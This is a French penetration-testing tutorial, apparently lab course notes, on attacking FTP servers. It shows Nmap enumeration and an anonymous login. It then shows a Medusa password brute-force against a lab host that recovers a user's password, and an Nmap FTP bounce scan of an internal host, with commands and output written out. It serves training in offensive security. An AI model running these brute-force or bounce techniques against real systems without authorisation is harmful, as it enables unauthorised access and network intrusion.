# Attaquer FTP 
Le protocole de transfert de fichiers (FTP) est un protocole réseau standard utilisé pour transférer des fichiers entre ordinateurs. Il effectue également des opérations sur les répertoires et les fichiers, telles que la modification du répertoire de travail, la liste des fichiers, et le renommage et la suppression de répertoires ou de fichiers. Par défaut, FTP écoute sur le port TCP/21.

Pour attaquer un serveur FTP, nous pouvons abuser d'une mauvaise configuration ou de privilèges excessifs, exploiter des vulnérabilités connues ou découvrir de nouvelles vulnérabilités. Par conséquent, après avoir obtenu l'accès au service FTP, nous devons être conscients du contenu du répertoire afin de pouvoir rechercher des informations sensibles ou critiques, comme nous l'avons vu précédemment. Le protocole est conçu pour déclencher des téléchargements et des téléchargements avec des commandes. Ainsi, les fichiers peuvent être transférés entre les serveurs et les clients. Un système de gestion de fichiers est à la disposition de l'utilisateur, connu par le système d'exploitation. Les fichiers peuvent être stockés dans des dossiers, qui peuvent se trouver dans d'autres dossiers. Il en résulte une structure de répertoire hiérarchique. La plupart des entreprises utilisent ce service pour les processus de développement de logiciels ou de sites Web.

## Énumération
Scripts Nmap par défaut -sC inclut le script ftp-anon Nmap qui vérifie si un serveur FTP autorise les connexions anonymes. L'indicateur d'énumération de version -sV fournit des informations intéressantes sur les services FTP, comme la bannière FTP, qui inclut souvent le nom de la version. Nous pouvons utiliser le client ftp ou nc pour interagir avec le service FTP. Par défaut, FTP s'exécute sur le port TCP 21.

### Nmap
```
dsgsec@htb[/htb]$ sudo nmap -sC -sV -p 21 192.168.2.142 

Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-10 22:04 EDT
Nmap scan report for 192.168.2.142
Host is up (0.00054s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--   1 1170     924            31 Mar 28  2001 .banner
| d--x--x--x   2 root     root         1024 Jan 14  2002 bin
| d--x--x--x   2 root     root         1024 Aug 10  1999 etc
| drwxr-srwt   2 1170     924          2048 Jul 19 18:48 incoming [NSE: writeable]
| d--x--x--x   2 root     root         1024 Jan 14  2002 lib
| drwxr-sr-x   2 1170     924          1024 Aug  5  2004 pub
|_Only 6 shown. Use --script-args ftp-anon.maxlist=-1 to see all.
```

## Mauvaises configurations
Comme nous en avons discuté, l'authentification anonyme peut être configurée pour différents services tels que FTP. Pour accéder avec une connexion anonyme, nous pouvons utiliser le nom d'utilisateur anonyme et aucun mot de passe. Cela sera dangereux pour l'entreprise si les autorisations de lecture et d'écriture n'ont pas été configurées correctement pour le service FTP. Parce qu'avec la connexion anonyme, l'entreprise aurait pu stocker des informations sensibles dans un dossier auquel l'utilisateur anonyme du service FTP pourrait avoir accès.

Cela nous permettrait de télécharger ces informations sensibles ou même de télécharger des scripts dangereux. En utilisant d'autres vulnérabilités, telles que la traversée de chemin dans une application Web, nous serions en mesure de savoir où se trouve ce fichier et de l'exécuter en tant que code PHP, par exemple.

### Authentification anonyme
```
dsgsec@htb[/htb]$ ftp 192.168.2.142    
                     
Connected to 192.168.2.142.
220 (vsFTPd 2.3.4)
Name (192.168.2.142:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0               9 Aug 12 16:51 test.txt
226 Directory send OK.
```

Une fois que nous avons accès à un serveur FTP avec des informations d'identification anonymes, nous pouvons commencer à rechercher des informations intéressantes. Nous pouvons utiliser les commandes ls et cd pour nous déplacer dans les répertoires comme sous Linux. Pour télécharger un seul fichier, nous utilisons get, et pour télécharger plusieurs fichiers, nous pouvons utiliser mget. Pour les opérations de téléchargement, nous pouvons utiliser put pour un fichier simple ou mput pour plusieurs fichiers. Nous pouvons utiliser l'aide de la session client FTP pour plus d'informations.

Dans le module Footprinting, nous couvrons des informations détaillées sur les éventuelles erreurs de configuration de ces services. Par exemple, de nombreux paramètres différents peuvent être appliqués à un serveur FTP, et certains d'entre eux conduisent à différentes options qui pourraient provoquer d'éventuelles attaques contre ce service. Cependant, ce module se concentrera sur des attaques spécifiques plutôt que sur la recherche de mauvaises configurations individuelles.

## Attaques spécifiques au protocole
De nombreuses attaques et méthodes différentes sont basées sur des protocoles. Cependant, il est essentiel de noter que nous n'attaquons pas les protocoles individuels eux-mêmes mais les services qui les utilisent. Puisqu'il existe des dizaines de services pour un même protocole et qu'ils traitent différemment les informations correspondantes, nous allons en examiner quelques-uns.

### Brute forcing
S'il n'y a pas d'authentification anonyme disponible, nous pouvons également forcer la connexion pour les services FTP en utilisant une liste de noms d'utilisateur et de mots de passe pré-générés. Il existe de nombreux outils différents pour effectuer une attaque par force brute. Explorons l'un d'entre eux, Medusa. Avec Medusa, nous pouvons utiliser l'option -u pour spécifier un seul utilisateur à cibler, ou vous pouvez utiliser l'option -U pour fournir un fichier avec une liste de noms d'utilisateur. L'option -P est pour un fichier contenant une liste de mots de passe. Nous pouvons utiliser l'option -M et le protocole que nous ciblons (FTP) et l'option -h pour le nom d'hôte ou l'adresse IP cible.

### Bruteforce avec Medusa
```
dsgsec@htb[/htb]$ medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp 
                                                             
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>                                                      
ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 123456 (1 of 14344392 complete)
ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 12345 (2 of 14344392 complete)
ACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 123456789 (3 of 14344392 complete)
ACCOUNT FOUND: [ftp] Host: 10.129.203.7 User: fiona Password: family [SUCCESS]
```

### Attaque de rebond FTP
Une attaque par rebond FTP est une attaque réseau qui utilise des serveurs FTP pour acheminer le trafic sortant vers un autre appareil du réseau. L'attaquant utilise une commande PORT pour inciter la connexion FTP à exécuter des commandes et à obtenir des informations d'un périphérique autre que le serveur prévu.

Considérons que nous ciblons un serveur FTP FTP_DMZ exposé à Internet. Un autre appareil du même réseau, Internal_DMZ, n'est pas exposé à Internet. Nous pouvons utiliser la connexion au serveur FTP_DMZ pour analyser Internal_DMZ à l'aide de l'attaque FTP Bounce et obtenir des informations sur les ports ouverts du serveur. Ensuite, nous pouvons utiliser ces informations dans le cadre de notre attaque contre l'infrastructure.

![ftp_bounce_attack.png](../../ressource/ftp_bounce_attack.png)

```
dsgsec@htb[/htb]$ nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-27 04:55 EDT
Resolved FTP bounce attack proxy to 10.10.110.213 (10.10.110.213).
Attempting connection to ftp://anonymous:password@10.10.110.213:21
Connected:220 (vsFTPd 3.0.3)
Login credentials accepted by FTP server!
Initiating Bounce Scan at 04:55
FTP command misalignment detected ... correcting.
Completed Bounce Scan at 04:55, 0.54s elapsed (1 total ports)
Nmap scan report for 172.17.0.2
Host is up.

PORT   STATE  SERVICE
80/tcp open http

<SNIP>
```
